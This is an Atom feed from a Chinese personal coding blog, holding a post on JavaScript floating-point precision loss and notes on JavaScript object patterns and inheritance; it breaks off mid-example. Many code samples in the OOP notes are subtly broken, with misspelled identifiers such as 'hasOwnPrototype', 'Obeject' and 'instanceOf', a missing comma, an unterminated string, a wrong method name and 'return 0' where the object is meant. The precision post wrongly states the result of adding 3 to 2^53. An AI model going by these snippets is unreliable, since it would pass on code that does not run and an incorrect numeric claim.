<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>团子的代码作坊</title>
  
  <subtitle>心有猛兽、细嗅蔷薇</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://dangoying.ink/"/>
  <updated>2019-03-30T15:21:16.040Z</updated>
  <id>http://dangoying.ink/</id>
  
  <author>
    <name>Dango</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>JS精度丢失问题</title>
    <link href="http://dangoying.ink/JS%E7%B2%BE%E5%BA%A6%E4%B8%A2%E5%A4%B1%E9%97%AE%E9%A2%98.html"/>
    <id>http://dangoying.ink/JS精度丢失问题.html</id>
    <published>2019-03-28T14:56:27.000Z</published>
    <updated>2019-03-30T15:21:16.040Z</updated>
    
    <content type="html"><![CDATA[<p>最近开发的项目新需求中，需要一个金额的输入框，其输入上限为16位整数带两位小数的浮点类型，由于前台显示的金额是字符串型，在传递给后台时使用了<code>parseFloat()</code>方法，却发现在测试校验最大临界值时，发生了四舍五入，最终导致校验失败，由此引发了我对JS浮点数表示和运算了深入理解。</p><a id="more"></a><h2 id="JS浮点数精度丢失的原因"><a href="#JS浮点数精度丢失的原因" class="headerlink" title="JS浮点数精度丢失的原因"></a>JS浮点数精度丢失的原因</h2><p>由于计算机的二进制实现和位数限制，有些数无法有限表示。就像一些无理数不能有限表示，如 圆周率 3.1415926…，1.3333… 等。JS 遵循 IEEE 754 规范，采用双精度存储（double precision），占用 64 bit。</p><p><img src="../assets/20190330/1.jpg" alt="Alt text"></p><ul><li>1位用来表示符号位</li><li>11位用来表示指数</li><li>52位表示尾数</li></ul><p>因为在计算机最底层，数值的运算和操作都是采用二进制实现的，所以计算机没有办法精确表示浮点数，而只能用二进制近似相等的去表示浮点数的小数部分。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0.1 &gt;&gt; 0.0001 1001 1001 1001…（1001无限循环）</span><br><span class="line">0.2 &gt;&gt; 0.0011 0011 0011 0011…（0011无限循环）</span><br></pre></td></tr></table></figure><p>当进行计算或其他操作时时，四舍五入（逢1进，逢0舍）将会导致最终的运算结果存在偏差。</p><p>而大整数也存在同样的问题，因为表示尾数的尾数只有52位，因此 JS 中能精准表示的最大整数是 Math.pow(2, 53)，即十进制9007199254740992。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">9007199254740992     &gt;&gt; 10000000000000...000 // 共计 53 个 0</span><br><span class="line">9007199254740992 + 1 &gt;&gt; 10000000000000...001 // 中间 52 个 0</span><br><span class="line">9007199254740992 + 2 &gt;&gt; 10000000000000...010 // 中间 51 个 0</span><br><span class="line">9007199254740992 + 1 // 丢失        //9007199254740992 </span><br><span class="line">9007199254740992 + 2 // 未丢失      //9007199254740994   </span><br><span class="line">9007199254740992 + 3 // 丢失        //9007199254740992 </span><br><span class="line">9007199254740992 + 4 // 未丢失      //9007199254740996</span><br></pre></td></tr></table></figure><p>由此可知，十进制中的有穷数值，在计算机底层，可能是0、1循环的无限数值。</p><p>在Java、C、C++中，均有对浮点数值的特殊处理，如Java的BigDecimal类型就是用来解决这一浮点数问题。</p><h2 id="常见的出错场合"><a href="#常见的出错场合" class="headerlink" title="常见的出错场合"></a>常见的出错场合</h2><h3 id="浮点数计算："><a href="#浮点数计算：" class="headerlink" title="浮点数计算："></a>浮点数计算：</h3><h3 id="浮点数比较："><a href="#浮点数比较：" class="headerlink" title="浮点数比较："></a>浮点数比较：</h3><h3 id="大整数计算："><a href="#大整数计算：" class="headerlink" title="大整数计算："></a>大整数计算：</h3><h3 id="大整数比较："><a href="#大整数比较：" class="headerlink" title="大整数比较："></a>大整数比较：</h3>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近开发的项目新需求中，需要一个金额的输入框，其输入上限为16位整数带两位小数的浮点类型，由于前台显示的金额是字符串型，在传递给后台时使用了&lt;code&gt;parseFloat()&lt;/code&gt;方法，却发现在测试校验最大临界值时，发生了四舍五入，最终导致校验失败，由此引发了我对JS浮点数表示和运算了深入理解。&lt;/p&gt;
    
    </summary>
    
      <category term="前端" scheme="http://dangoying.ink/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="前端" scheme="http://dangoying.ink/tags/%E5%89%8D%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>JS面向对象程序设计</title>
    <link href="http://dangoying.ink/JS%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1.html"/>
    <id>http://dangoying.ink/JS面向对象程序设计.html</id>
    <published>2019-03-24T03:41:03.000Z</published>
    <updated>2019-03-25T14:16:30.561Z</updated>
    
    <content type="html"><![CDATA[<h2 id="属性类型"><a href="#属性类型" class="headerlink" title="属性类型"></a>属性类型</h2><h3 id="数据属性"><a href="#数据属性" class="headerlink" title="数据属性"></a>数据属性</h3><table><thead><tr><th style="text-align:left">属性名</th><th style="text-align:left">解释</th></tr></thead><tbody><tr><td style="text-align:left">[[Configurable]]</td><td style="text-align:left">表示能否通过delete删除属性从而重新定义属性，默认为true</td></tr><tr><td style="text-align:left">[[Enumerable]]</td><td style="text-align:left">表示能否通过for-in循环返回属性，默认为true</td></tr><tr><td style="text-align:left">[[Writable]]</td><td style="text-align:left">表示能否修改属性的值，默认为true</td></tr><tr><td style="text-align:left">[[Value]]</td><td style="text-align:left">包含这个属性的数值，默认为undefined</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var person = &#123;&#125;;</span><br><span class="line">Object.defineProperty(person,&quot;name&quot;,&#123;</span><br><span class="line">    writable: false,</span><br><span class="line">    value: &quot;Nicholas&quot;</span><br><span class="line">&#125;);</span><br><span class="line">alert(person.name);  // &quot;Nicholas&quot;</span><br><span class="line">person.name = &quot;Greg&quot;;</span><br><span class="line">alert(person.name);  // &quot;Nicholas&quot;,通过修改属性使之不能被修改</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="访问器属性"><a href="#访问器属性" class="headerlink" title="访问器属性"></a>访问器属性</h3><table><thead><tr><th style="text-align:left">属性名</th><th style="text-align:left">解释</th></tr></thead><tbody><tr><td style="text-align:left">[[Configurable]]</td><td style="text-align:left">表示能否修改属性的特性，或者能否把属性修改为数据属性，默认为true</td></tr><tr><td style="text-align:left">[[Enumerable]]</td><td style="text-align:left">表示能否通过for-in循环返回属性，默认为true</td></tr><tr><td style="text-align:left">[[Get]]</td><td style="text-align:left">在读取属性时调用的函数，默认为undefined</td></tr><tr><td style="text-align:left">[[Set]]</td><td style="text-align:left">在写入属性时调用的函数，默认为undefined</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">var book = &#123;</span><br><span class="line">    _year: 2004,</span><br><span class="line">    edition: 1</span><br><span class="line">&#125;;</span><br><span class="line">Object.defineProperty(book,&quot;year&quot;,&#123;</span><br><span class="line">    get: function()&#123;</span><br><span class="line">        return this._year;</span><br><span class="line">    &#125;</span><br><span class="line">    set: function(newValue)&#123;</span><br><span class="line">        if(newVale &gt; 2004)&#123;</span><br><span class="line">            this._year = newValue;</span><br><span class="line">            this.edition += newValue - 2004;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">book.year = 2005;</span><br><span class="line">alert(book.edition);  // 2,访问属性只能用Object.defineProperty定义</span><br></pre></td></tr></table></figure><h3 id="定义多个属性"><a href="#定义多个属性" class="headerlink" title="定义多个属性"></a>定义多个属性</h3><p>使用Object.defineProperty方法定义多个属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var book = &#123;&#125;;</span><br><span class="line">Object.defineProperty(book,&#123;</span><br><span class="line">    _year: &#123;</span><br><span class="line">        writable: true,</span><br><span class="line">        value: 2004</span><br><span class="line">    &#125;,</span><br><span class="line">    edition: &#123;</span><br><span class="line">        wirtable: true,</span><br><span class="line">        value: 1</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="读取属性的特性"><a href="#读取属性的特性" class="headerlink" title="读取属性的特性"></a>读取属性的特性</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var descriptor = Object.getOwnPropertyDescriptor(book,&quot;_year&quot;);</span><br><span class="line">alert(descriptor.value);  //2004</span><br><span class="line">alert(descriptor.configurable);   //false</span><br><span class="line">alert(typeof descriptor.get);    //&quot;undefined&quot;</span><br></pre></td></tr></table></figure><h2 id="创建对象"><a href="#创建对象" class="headerlink" title="创建对象"></a>创建对象</h2><h3 id="工厂模式"><a href="#工厂模式" class="headerlink" title="工厂模式"></a>工厂模式</h3><p>抽象了创建具体对象的过程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function createPerson(name,age,job)&#123;</span><br><span class="line">    var o = new Object();</span><br><span class="line">    o.name = name;</span><br><span class="line">    o.age = age;</span><br><span class="line">    o.job = job;</span><br><span class="line">    o.sayName = function()&#123;</span><br><span class="line">        alert(this.name);</span><br><span class="line">    &#125;;</span><br><span class="line">    return o;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="构造函数模式"><a href="#构造函数模式" class="headerlink" title="构造函数模式"></a>构造函数模式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function Person(name,age,job)&#123;</span><br><span class="line">    this.name = name;</span><br><span class="line">    this.age = age;</span><br><span class="line">    this.job = job;</span><br><span class="line">    this.sayName = function()&#123;</span><br><span class="line">        alert(this.name);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line">var person1 = new Person(&quot;Nicholas&quot;,29,&quot;Software Engineer&quot;);</span><br><span class="line"></span><br><span class="line">// 使用call实现在特殊作用于中调用Person函数</span><br><span class="line">var o = new Object();</span><br><span class="line">Person.call(o,&quot;Kristen&quot;,25,&quot;Nurse&quot;);</span><br><span class="line">o.sayName();   //&quot;Kristen&quot;</span><br></pre></td></tr></table></figure><p>此方法特点：</p><ul><li>没有显示地创建对象</li><li>直接将属性方法赋给了his对象</li><li>没有return语句</li><li>不同实例上的同名函数每次都是新创建初始化，他们之间不相等<br>最好将函数定义转移到构造函数外</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function Person(name,age,job)&#123;</span><br><span class="line">    this.name = name;</span><br><span class="line">    this.age = age;</span><br><span class="line">    this.job = job;</span><br><span class="line">    this.sayName = sayName;</span><br><span class="line">&#125;</span><br><span class="line">function sayName()&#123;</span><br><span class="line">    alert(this.name);</span><br><span class="line">&#125;</span><br><span class="line">var person1 = new Person(&quot;Nicholas&quot;,29,&quot;Software Engineer&quot;);</span><br></pre></td></tr></table></figure><h3 id="原型模式"><a href="#原型模式" class="headerlink" title="原型模式"></a>原型模式</h3><p>创建的每个函数都有一个prototype属性，这个属性指向一个对象，该对象的用途是包含可以由特定类型的所有实例共享的属性和方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function Person()&#123;</span><br><span class="line">&#125;</span><br><span class="line">Person.prototype.name = &quot;Nicholas&quot;;</span><br><span class="line">Person.prototype.age = 29;</span><br><span class="line">Person.prototype.job = &quot;Software Engineer&quot;;</span><br><span class="line">Person.prototype.sayName = function()&#123;</span><br><span class="line">    alert(this.name);</span><br><span class="line">&#125;;</span><br><span class="line">var person1 = new Person();</span><br><span class="line">person1.sayName();   //&quot;Nicholas&quot;,来自原型</span><br></pre></td></tr></table></figure><p><img src="../assets/jsoop/20190324153411.png" alt="Alt text"></p><p>可以通过isPrototypeOf来确定对象之间是否存在这种关系</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">alert(Person.prototype.isPrototypeOf(person1));   //true</span><br><span class="line">alert(Person.getPrototypeOf(person) == Person.prototype);   //true</span><br><span class="line">alert(Obeject.getPrototypeOf(person1).name);   //&quot;Nicholas&quot;</span><br></pre></td></tr></table></figure><p>可以通过hasOwnProperty来检测一个属性是否存在于实例中，只有存在于实例中，才会返回true</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">alert(person1.hasOwnPrototype(&quot;name&quot;));   //false</span><br><span class="line">person1.name = &quot;Greg&quot;;</span><br><span class="line">alert(person1.name);   //&quot;Greg&quot;,来自实例</span><br><span class="line">alert(person1.hasOwnPrototype(&quot;name&quot;));   //true</span><br><span class="line">delete person1.name;</span><br><span class="line">alert(person1.name);   //&quot;Nicholas&quot;,来自原型</span><br><span class="line">alert(person1.hasOwnPrototype(&quot;name&quot;));   //false</span><br></pre></td></tr></table></figure><p>in操作符会在通过对象能够访问给定属性时返回true，无论其在实例还是原型中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(&quot;name&quot; in person1);   //true</span><br></pre></td></tr></table></figure><p>for-in循环，返回的是所有能够通过对象访问、可枚举的属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var o = &#123;</span><br><span class="line">    toString: function()&#123;</span><br><span class="line">        return &quot;My Object&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">for(var prop in o)&#123;</span><br><span class="line">    if(pop == &quot;toString&quot;)&#123;</span><br><span class="line">        alert(&quot;Found toString&quot;);   //IE中不会显示，认为原型中的toString被屏蔽</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用Object.key可以取得所有可枚举的实力属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var keys = Object.keys(Person.prototype);</span><br><span class="line">alert(keys);   //&quot;name,age,job,sayName&quot;</span><br><span class="line">var p1 = new Person();</span><br><span class="line">p1.name = &quot;Rob&quot;;</span><br><span class="line">p1.age = 31;</span><br><span class="line">var p1Keys = Object.keys(p1);</span><br><span class="line">alert(p1Keys);   //&quot;name,age&quot;</span><br></pre></td></tr></table></figure><p>更简单的原型创建语法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function Person()&#123;</span><br><span class="line">&#125;</span><br><span class="line">Person.prototype = &#123;</span><br><span class="line">    name: &quot;Nicholas&quot;,</span><br><span class="line">    age: 29,</span><br><span class="line">    job: &quot;Software Engineer&quot;,</span><br><span class="line">    sayName: function()&#123;</span><br><span class="line">        alert(this.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// 此时constructor不再指向Person了，如果需要可以将constructor的值设为Person</span><br></pre></td></tr></table></figure><p>对原型对象所做的修改可以立即从实例上反映出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var friend = new Person();</span><br><span class="line">Person.prototype.sayHi = function()&#123;</span><br><span class="line">    alert(&quot;Hi&quot;);</span><br><span class="line">&#125;</span><br><span class="line">friends.sayHi();   //&quot;Hi&quot;</span><br></pre></td></tr></table></figure><p>但重写整个原型对象就不可以了，此时constructor指向新创建的对象</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">var Person()&#123;</span><br><span class="line">&#125;</span><br><span class="line">var friend = new Person();</span><br><span class="line">Person.prototype = &#123;</span><br><span class="line">    constructor: Person,</span><br><span class="line">    name: &quot;Nicholas&quot;,</span><br><span class="line">    age: 29,</span><br><span class="line">    job: &quot;Software Engineer&quot;,</span><br><span class="line">    sayName: function()&#123;</span><br><span class="line">        alert(this.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">friends.sayName();   //error</span><br></pre></td></tr></table></figure><p>通过原生对象原型，可以取得所有默认方法的引用，而且也可以定义新方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">String.prototype.startsWith = function(text)&#123;</span><br><span class="line">    return this.indexOf(text) == 0;</span><br><span class="line">&#125;;</span><br><span class="line">var msg = &quot;Hello world&quot;;</span><br><span class="line">alert(msg.startsWith(&quot;Hello&quot;));   //true</span><br></pre></td></tr></table></figure><p>原生对象存在缺点，包含引用类型值的属性将被所有实例共享，例如属性中包含数组</p><h3 id="组合使用构造函数和原型模式"><a href="#组合使用构造函数和原型模式" class="headerlink" title="组合使用构造函数和原型模式"></a>组合使用构造函数和原型模式</h3><p>构造函数模式用于定义实例属性，而原型模式用于定义方法和共享的属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function Person(name,age,job)&#123;</span><br><span class="line">    this.name = name;</span><br><span class="line">    this.age = age;</span><br><span class="line">    this.job = job;</span><br><span class="line">    this.friends = [&quot;Shelly&quot;,&quot;Court&quot;];</span><br><span class="line">&#125;</span><br><span class="line">Person.prototype = &#123;</span><br><span class="line">    constructor: Person,</span><br><span class="line">    sayName: function()&#123;</span><br><span class="line">        alert(this.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">var person1 = new Person(&quot;Nicholas&quot;,29,&quot;SoftWare Engineer&quot;);</span><br><span class="line">var person2 = new Person(&quot;Greg&quot;,27,&quot;Doctor&quot;);</span><br><span class="line">person1.friends.push(&quot;Van&quot;);</span><br><span class="line">alert(person1.friends);   //&quot;Shelly,Court,Van&quot;</span><br><span class="line">alert(person2.friends);   //&quot;Shelly,Court&quot;</span><br></pre></td></tr></table></figure><h3 id="动态原型模式"><a href="#动态原型模式" class="headerlink" title="动态原型模式"></a>动态原型模式</h3><p>通过检查某个应该存在的方法是否有效，来决定是否需要初始化原型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function Person(name,age,job)&#123;</span><br><span class="line">    this.name = name;</span><br><span class="line">    this.age = age;</span><br><span class="line">    this.job = job;</span><br><span class="line">    if(typeof this.sayName != &quot;function&quot;)&#123;</span><br><span class="line">        Person.prototype.sayName = function()&#123;</span><br><span class="line">            alert(this.name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="寄生构造函数模式"><a href="#寄生构造函数模式" class="headerlink" title="寄生构造函数模式"></a>寄生构造函数模式</h3><p>该模式用来为对象创建构造函数，以此创建一个具有额外方法的特殊对象</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function SpecialArray()&#123;</span><br><span class="line">    var values = new Array();</span><br><span class="line">    values.push.apply(values,arguments);</span><br><span class="line">    values.toPipedString = function()&#123;</span><br><span class="line">        return this.join(&quot;|);</span><br><span class="line">    &#125;;</span><br><span class="line">    return values;</span><br><span class="line">&#125;</span><br><span class="line">var colors = new SpecialArray(&quot;red&quot;,&quot;blue&quot;,&quot;green&quot;);</span><br><span class="line">alert(colors.toPipedString());    //&quot;red|blue|green&quot;</span><br></pre></td></tr></table></figure><h3 id="稳妥构造函数模式"><a href="#稳妥构造函数模式" class="headerlink" title="稳妥构造函数模式"></a>稳妥构造函数模式</h3><p>稳妥对象最适合在一些安全的环境中（这些环境中会禁止使用this和new）或者防止数据被其他应用程序（如Mashup程序）改动时使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function Person(name,age,job)&#123;</span><br><span class="line">    var o = new Object();</span><br><span class="line">    o.sayName = function()&#123;</span><br><span class="line">        alert(name);    //name只能通过sayName方法访问</span><br><span class="line">    &#125;;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><h3 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h3><p>实现原型链的基本模式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function SuperType()&#123;</span><br><span class="line">    this.property = true;</span><br><span class="line">&#125;</span><br><span class="line">SuperType.prototype.getSuperValue = function()&#123;</span><br><span class="line">    return this.property;</span><br><span class="line">&#125;;</span><br><span class="line">function SubType()&#123;</span><br><span class="line">    this.subproperty = false;</span><br><span class="line">&#125;</span><br><span class="line">SubType.prototype = new SuperType();</span><br><span class="line">SubType.prototype.getSubValue = function()&#123;</span><br><span class="line">    return this.subproperty;</span><br><span class="line">&#125;;</span><br><span class="line">var instance = new SubType();</span><br><span class="line">alert(instance.getSuperValue());   //true</span><br></pre></td></tr></table></figure><p><img src="../assets/jsoop/20190324225152.png" alt="Alt text"></p><p>以上代码中，可用instanceof和isPrototypeOf来确定原型和实例之间的关系</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">alert(instance instanceOf Object);   //true</span><br><span class="line">alert(instance instanceOf SuperType);   //true</span><br><span class="line">alert(instance instanceOf SubType);   //true</span><br><span class="line">alert(Object.prototype.isPrototypeOf(instance));   //true</span><br></pre></td></tr></table></figure><p>通过原型链实现继承时，不能使用对象字面量创建原型方法，因为这样会重写原型链，原型链中存在问题，包含引用类型值的原型属性会被所有实例共享</p><h3 id="借用构造函数"><a href="#借用构造函数" class="headerlink" title="借用构造函数"></a>借用构造函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">function SuperType()&#123;</span><br><span class="line">    this.colors: [&quot;red&quot;,&quot;blue&quot;,&quot;green&quot;];</span><br><span class="line">&#125;</span><br><span class="line">function SubType()&#123;</span><br><span class="line">    SuperType.call(this);   //执行了SuperType中定义的所有对象初始化代码</span><br><span class="line">&#125;</span><br><span class="line">var instance1 = new SubType();</span><br><span class="line">instance1.colors.push(&quot;black&quot;);</span><br><span class="line">alert(instance1.colors);   //&quot;red,blue,green,black&quot;</span><br><span class="line">var instance2 = new SubType();</span><br><span class="line">alert(instance2.colors);   //&quot;red,blue,green&quot;</span><br><span class="line"></span><br><span class="line">// 还可以传递参数</span><br><span class="line">function SuperType(name)&#123;</span><br><span class="line">    this.name = name;</span><br><span class="line">&#125;</span><br><span class="line">function SubType()&#123;</span><br><span class="line">    SuperType.call(this,&quot;Nicholas&quot;);</span><br><span class="line">    this.age = 29;</span><br><span class="line">&#125;</span><br><span class="line">var instance = new SubType();</span><br><span class="line">alert(instance.name);   //&quot;Nicholas&quot;</span><br><span class="line">alert(instance.age);   //29</span><br></pre></td></tr></table></figure><p>如同仅仅借用构造函数，则无法函数复用</p><h3 id="组合继承"><a href="#组合继承" class="headerlink" title="组合继承"></a>组合继承</h3><p>使用原型链实现对原型属性和方法的继承，通过借用构造函数实现对实例的继承</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">function SuperType(name)&#123;</span><br><span class="line">    this.name = name;</span><br><span class="line">    this.colors = [&quot;red&quot;,&quot;blue&quot;,&quot;green&quot;];</span><br><span class="line">&#125;</span><br><span class="line">SuperType.prototype.sayName = function()&#123;</span><br><span class="line">    alert(this.name);</span><br><span class="line">&#125;</span><br><span class="line">function SubType(name,age)&#123;</span><br><span class="line">    SuperType.call(this,name);    //继承属性</span><br><span class="line">    this.age = age;</span><br><span class="line">&#125;</span><br><span class="line">SubType.prototype = new SuperType();   //继承方法</span><br><span class="line">SubType.prototype.constructor = SubType;</span><br><span class="line">SubType.prototype.sayAge = function()&#123;</span><br><span class="line">    alert(this.age);</span><br><span class="line">&#125;;</span><br><span class="line">var instance1 = new SubType(&quot;Nicholas&quot;,29);</span><br><span class="line">instance1.colors.push(&quot;black&quot;);</span><br><span class="line">alert(instance1.colors);   //&quot;red,blue,green,black&quot;</span><br><span class="line">instance1.sayName();   //&quot;Nicholas&quot;</span><br><span 